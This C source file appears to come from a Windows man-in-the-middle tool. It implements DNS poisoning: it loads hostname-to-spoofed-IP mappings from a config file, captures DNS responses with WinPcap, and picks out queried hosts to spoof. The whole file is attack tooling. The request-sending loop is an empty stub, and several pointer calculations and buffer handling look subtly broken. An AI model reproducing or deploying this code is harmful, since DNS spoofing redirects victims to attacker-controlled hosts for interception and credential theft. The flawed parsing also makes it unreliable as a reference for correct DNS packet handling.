#define HAVE_REMOTE

#include <pcap.h>
#include <windows.h>

#include "APE.h"
#include "DnsHelper.h"
#include "DnsPoisoning.h"
#include "LinkedListSpoofedDnsHosts.h"
#include "NetworkFunctions.h"
#include "DnsStructs.h"


extern PHOSTNODE gHostsList;



void ParseDnsPoisoningConfigFile(char *configFileParam)
{
  FILE *fileHandle = NULL;
  int index = 0;
  char tmpLine[MAX_BUF_SIZE + 1];
  unsigned char hostname[MAX_BUF_SIZE + 1];
  unsigned char spoofedIpAddr[MAX_BUF_SIZE + 1];

  if (configFileParam == NULL || (fileHandle = fopen(configFileParam, "r")) == NULL)
  {
    return;
  }

  ZeroMemory(tmpLine, sizeof(tmpLine));
  ZeroMemory(hostname, sizeof(hostname));
  ZeroMemory(spoofedIpAddr, sizeof(spoofedIpAddr));

  while (fgets(tmpLine, sizeof(tmpLine), fileHandle) != NULL)
  {
    while (tmpLine[strlen(tmpLine) - 1] == '\r' || tmpLine[strlen(tmpLine) - 1] == '\n')
    {
      tmpLine[strlen(tmpLine) - 1] = '\0';
    }

    // Parse values and add them to the list.
    if (sscanf(tmpLine, "%[^,],%s", hostname, spoofedIpAddr) == 2)
    {
      AddSpoofedIpToList(&gHostsList, hostname, spoofedIpAddr);
      LogMsg(DBG_INFO, "ParseDnsPoisoningConfigFile(): Host:%s -> SpoofedIP:%s", hostname, spoofedIpAddr);
    }

    ZeroMemory(tmpLine, sizeof(tmpLine));
    ZeroMemory(hostname, sizeof(hostname));
    ZeroMemory(spoofedIpAddr, sizeof(spoofedIpAddr));
  }

  fclose(fileHandle);
}



int DetermineSpoofingResponseData(PSCANPARAMS scanParams)
{
  int retVal = 0;
  PHOSTNODE hostTmp = NULL;
  HANDLE dnsResponseThreadHandle = INVALID_HANDLE_VALUE;
  DWORD dnsResponseThreadId = 0;

  if ((dnsResponseThreadHandle = CreateThread(NULL, 0, DnsResponseSniffer, scanParams, 0, &dnsResponseThreadId)) != NULL)
  {
    // 1. Send DNS requests
    for (hostTmp = gHostsList; hostTmp != NULL && hostTmp->next != NULL; hostTmp = (PHOSTNODE)hostTmp->next)
    {
      Sleep(400);
    }
  }

  return retVal;
}



DWORD WINAPI DnsResponseSniffer(LPVOID lpParam)
{
  DWORD retVal = 0;
  pcap_t *ifcReadHandle = NULL;
  PSCANPARAMS scanParams = (PSCANPARAMS)lpParam;
  char pcapErrorBuffer[PCAP_ERRBUF_SIZE];
  char filter[MAX_BUF_SIZE + 1];
  struct bpf_program filterCode;
  unsigned int netMask = 0;
  int pcapRetVal = 0;
  struct pcap_pkthdr *packetHeader = NULL;
  unsigned char *packetData = NULL;
  PETHDR ethrHdr = NULL;
  PIPHDR ipHdr = NULL;
  PUDPHDR udpHdr = NULL;
  int ipHdrLen = 0;
  char *dnsData = NULL;
  //PDNS_HDR dnsHdr = NULL;
  PDNS_HEADER dnsHdr = NULL;
  char dstIp[MAX_BUF_SIZE + 1];
  char srcIp[MAX_BUF_SIZE + 1];
  int dstPort = -1;
  int srcPort = -1;
  int counter = 0;
  u_char* urlPacket = NULL;
  u_char* urlTemp = NULL;

  ZeroMemory(pcapErrorBuffer, sizeof(pcapErrorBuffer));
  ZeroMemory(&filterCode, sizeof(filterCode));
  ZeroMemory(filter, sizeof(filter));

  // 0. Initialize sniffer
  if ((ifcReadHandle = pcap_open_live((char *)scanParams->interfaceName, 65536, PCAP_OPENFLAG_NOCAPTURE_LOCAL | PCAP_OPENFLAG_MAX_RESPONSIVENESS, PCAP_READTIMEOUT, pcapErrorBuffer)) == NULL)
  {
    LogMsg(DBG_ERROR, "DnsResponseSniffer(): Unable to open the adapter: %s", pcapErrorBuffer);
    retVal = 1;
    goto END;
  }

  _snprintf(filter, sizeof(filter) - 1, "src port 53 and dst host %s", scanParams->localIpStr);
  netMask = 0xffffff;

  if (pcap_compile((pcap_t *)ifcReadHandle, &filterCode, (const char *)filter, 1, netMask) < 0)
  {
    LogMsg(DBG_ERROR, "DnsResponseSniffer(): Unable to compile the BPF filter \"%s\"", filter);
    retVal = 6;
    goto END;
  }

  if (pcap_setfilter((pcap_t *)ifcReadHandle, &filterCode) < 0)
  {
    LogMsg(DBG_ERROR, "DnsResponseSniffer(): Unable to set the BPF filter \"%s\"", filter);
    retVal = 7;
    goto END;
  }

  // Start intercepting data packets.
  while ((pcapRetVal = pcap_next_ex(ifcReadHandle, (struct pcap_pkthdr **) &packetHeader, &packetData)) >= 0)
  {
    if (pcapRetVal == 0)
    {
      continue;
    }
    else if (pcapRetVal < 0)
    {
      printf("Error reading the packets: %s\n", pcap_geterr(ifcReadHandle));
      break;
    }

    ethrHdr = (PETHDR)packetData;
    if (ethrHdr == NULL || htons(ethrHdr->ether_type) != ETHERTYPE_IP)
    {
      continue;
    }

    ipHdr = (PIPHDR)(packetData + 14);
    if (ipHdr == NULL || ipHdr->proto != IP_PROTO_UDP)
    {
      continue;
    }

    ipHdrLen = (ipHdr->ver_ihl & 0xf) * 4;
    if (ipHdrLen <= 0)
    {
      continue;
    }

    udpHdr = (PUDPHDR)((unsigned char*)ipHdr + ipHdrLen);
    if (udpHdr == NULL || udpHdr->ulen <= 0 || ntohs(udpHdr->sport) != UDP_DNS)
    {
      continue;
    }

    dnsData = ((char*)udpHdr + sizeof(UDPHDR));
    dnsHdr = (PDNS_HEADER)&dnsData[sizeof(DNS_HEADER)];

    if (dnsHdr == NULL)
    {
      continue;
    }

    if (ntohs(dnsHdr->q_count) <= 0)
    {
      continue;
    }

    ZeroMemory(dstIp, sizeof(dstIp));
    ZeroMemory(srcIp, sizeof(srcIp));

    IpBin2String((unsigned char *)&ipHdr->daddr, (unsigned char *)dstIp, sizeof(dstIp) - 1);
    IpBin2String((unsigned char *)&ipHdr->saddr, (unsigned char *)srcIp, sizeof(srcIp) - 1);
    dstPort = ntohs(udpHdr->dport);
    srcPort = ntohs(udpHdr->sport);

    urlTemp = (u_char*)malloc(2 * MAX_BUF_SIZE + 2);
    urlPacket = (u_char*)(dnsHdr + sizeof(DNS_HEADER));
    for (counter = 0; urlPacket[counter] != 0; counter++)
    {
      urlTemp[counter] = urlPacket[counter];
    }

    urlTemp[counter] = 0;
    counter++;

    printf("DNS: %s:%d -> %s:%d id:0x%04x, icount:%d ...\n", srcIp, srcPort, dstIp, dstPort, dnsHdr->id, counter);
  }


END:

  if (ifcReadHandle)
  {
    pcap_close(ifcReadHandle);
  }

  return retVal;
}


void *DnsResponsePoisonerGetHost2Spoof(u_char *dataParam)
{
  PETHDR ethrHdr = (PETHDR)dataParam;
  PIPHDR ipHdr = NULL;
  PUDPHDR udpHdr = NULL;
  int ipHdrLen = 0;
  char *data = NULL;
  char *dnsData = NULL;
  PHOSTNODE retVal = NULL;
  PHOSTNODE tmpNode = NULL;
  PDNS_HEADER dnsHdr = NULL;
  unsigned char *reader = NULL;
  int stop;
  unsigned char *peerName = NULL;


  if (ethrHdr == NULL || htons(ethrHdr->ether_type) != ETHERTYPE_IP)
  {
    return retVal;
  }

  ipHdr = (PIPHDR)(dataParam + 14);
  if (ipHdr == NULL || ipHdr->proto != IP_PROTO_UDP)
  {
    return retVal;
  }

  ipHdrLen = (ipHdr->ver_ihl & 0xf) * 4;
  if (ipHdrLen <= 0)
  {
    return retVal;
  }

  udpHdr = (PUDPHDR)((unsigned char*)ipHdr + ipHdrLen);
  if (udpHdr == NULL || udpHdr->ulen <= 0 || ntohs(udpHdr->sport) != UDP_DNS)
  {
    return retVal;
  }

  dnsData = ((char*)udpHdr + sizeof(UDPHDR));
  if ((dnsHdr = (PDNS_HEADER)&dnsData[sizeof(DNS_HEADER)]) == NULL)
  {
    return retVal;
  }

  if (ntohs(dnsHdr->q_count) <= 0)
  {
    return retVal;
  }

  reader = (unsigned char *)&dnsData[sizeof(DNS_HEADER)];
  stop = 0;

  if ((peerName = ChangeDnsNameToTextFormat(reader, (unsigned char *)dnsHdr, &stop)) != NULL)
  {
    if ((tmpNode = GetNodeByHostname(gHostsList, peerName)) != NULL)
    {
      retVal = tmpNode;
    }

    HeapFree(GetProcessHeap(), 0, peerName);
  }

  return retVal;
}


int GetReqHostName(unsigned char *packetParam, int packetLengthParam, char *hostnameParam, int hostBufferLengthParam)
{
  int retVal = OK;
  PETHDR etherHdrPtr = NULL;
  PIPHDR ipHdrPtr = NULL;     // ip header
  PUDPHDR udpHdrPtr = NULL;   // udp header
                              //PDNS_HDR dnsHdrPtr = NULL;  // dns header
  PDNS_HEADER dnsHdrPtr = NULL;
  char *data = NULL;
  int ipHdrLength = 0;
  int dataLength = 0;
  int index1;
  int count2;

  etherHdrPtr = (PETHDR)packetParam;
  ipHdrPtr = (PIPHDR)((unsigned char*)packetParam + sizeof(ETHDR));
  ipHdrLength = (ipHdrPtr->ver_ihl & 0xf) * 4;
  udpHdrPtr = (PUDPHDR)((unsigned char*)ipHdrPtr + ipHdrLength);
  //dnsHdrPtr = (PDNS_HDR) ((unsigned char*) udpHdrPtr + sizeof(UDPHDR));
  dnsHdrPtr = (PDNS_HEADER)((unsigned char*)udpHdrPtr + sizeof(UDPHDR));
  //data = (char *)((unsigned char*)dnsHdrPtr + sizeof(DNS_HDR));
  data = (char *)((unsigned char*)dnsHdrPtr + sizeof(DNS_HEADER));


  // Extract host name
  //if ((dataLength = packetLengthParam - (sizeof(ETHDR) + ipHdrLength + sizeof(UDPHDR) + sizeof(PDNS_HDR))) > 0)
  if ((dataLength = packetLengthParam - (sizeof(ETHDR) + ipHdrLength + sizeof(UDPHDR) + sizeof(PDNS_HEADER))) > 0)
  {
    count2 = 0;

    for (index1 = 1; index1 < dataLength && count2 < hostBufferLengthParam; index1++)
    {
      if (data[index1] > 31 && data[index1] < 127)
      {
        hostnameParam[count2++] = data[index1];
      }
      else if (data[index1] == '\0')
      {
        break;
      }
      else
      {
        hostnameParam[count2++] = '.';
      }
    }
  }

  if (count2 > 2)
  {
    retVal = OK;
  }

  return retVal;
}

